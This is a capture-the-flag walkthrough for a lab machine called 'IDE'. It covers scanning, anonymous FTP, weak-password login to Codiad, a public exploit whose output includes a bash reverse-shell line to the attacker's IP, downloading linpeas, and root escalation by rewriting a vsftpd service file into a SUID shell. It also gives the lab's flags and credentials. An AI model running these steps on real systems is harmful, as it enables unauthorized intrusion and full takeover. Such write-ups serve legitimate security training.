# IDE


1. Scan with Rustscan.
```
root@ip-10-10-72-98:~# rustscan -r 1-65535 -a 10.10.239.20
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.\U0001f422

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.239.20:21
Open 10.10.239.20:22
Open 10.10.239.20:80
Open 10.10.239.20:62337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-26 04:02 UTC
Initiating Ping Scan at 04:02
Scanning 10.10.239.20 [2 ports]
Completed Ping Scan at 04:02, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:02
Completed Parallel DNS resolution of 1 host. at 04:02, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:02
Scanning ip-10-10-239-20.eu-west-1.compute.internal (10.10.239.20) [4 ports]
Discovered open port 80/tcp on 10.10.239.20
Discovered open port 22/tcp on 10.10.239.20
Discovered open port 21/tcp on 10.10.239.20
Discovered open port 62337/tcp on 10.10.239.20
Completed Connect Scan at 04:02, 0.00s elapsed (4 total ports)
Nmap scan report for ip-10-10-239-20.eu-west-1.compute.internal (10.10.239.20)
Host is up, received syn-ack (0.00044s latency).
Scanned at 2022-06-26 04:02:40 UTC for 0s

PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
62337/tcp open  unknown syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

2. Log into ftp as `anonymous`. Use `ls -al`, navigate to the `...` directory with `cd ...`, and download the `-` file with `get ./-`. Use `cat ./-` to view the contents.
```
root@ip-10-10-72-98:~# cat ./-
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```

3. Brute force directories with gobuster. No unique directories were found.
```
root@ip-10-10-72-98:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.239.20:80
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.239.20:80
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/06/26 05:08:20 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2022/06/26 05:08:22 Finished
===============================================================
```

4. Navigate to `http://<ip address>:62337` and we find that it's a portal for `Codiad`, which is running version `2.8.4`. We know that the username is probably `john` from the note that `drac` left, so by trying commonly used passwords we find that the password is `password`

5. Use [this](https://www.exploit-db.com/exploits/49705) exploit to get a shell into the system
```
root@ip-10-10-72-98:~/Downloads# python exploit.py http://10.10.239.20:62337/ john password 10.10.72.98 4444 linux
[+] Please execute the following command on your vps:
echo 'bash -c "bash -i >/dev/tcp/10.10.72.98/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"john"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"CloudCall","path":"\/var\/www\/html\/codiad_projects"}}
[+] Writeable Path : /var/www/html/codiad_projects
[+] Sending payload...
```

6. Download [Linpeas](https://github.com/carlospolop/PEASS-ng/releases/download/20220619/linpeas.sh) onto the attacking machine and host it on an http server with `python3 -m http.server`. Download it onto the victim machine with `wget http://<ip address>:8000/linpeas.sh`. Give it permissions to run with `chmod +x linpeas.sh` and run it with `./linpeas.sh`

7. We find a password for `drac` in a history file. Use this password to login to ssh as `drac`
```
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

8. Print out the contents of `user.txt` to get the first flag
```
drac@ide:~$ cat user.txt
02930d21a8eb009f6d26361b2d24a466
```

9. Use `sudo -l` to find that we can run `vsftpd` as root
```
drac@ide:/tmp$ sudo -l
[sudo] password for drac:
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

10. Navigate to `/lib/systemd/system/vsftpd.service` and edit the `ExecStart` section to `/bin/bash -c 'cp /bin/bash /tmp/root_shell; chmod +xs /tmp/root_shell'`. Then run `sudo -u root /usr/sbin/service vsftpd restart` and `systemctl daemon-reload`. This will make a copy of bash in `/tmp` and we'll be able to run it with the `-p` flag to get a root shell

11. Run `root_shell -p` to get a root shell and print out `root.txt` to get `ce258cb16f47f1c66f0b0b77f4e0fb8d`
```
drac@ide:/tmp$ ./root_shell -p
root_shell-4.4# whoami
root
root_shell-4.4# cd /root
root_shell-4.4# ls
root.txt
root_shell-4.4# cat root.txt
ce258cb16f47f1c66f0b0b77f4e0fb8d
```
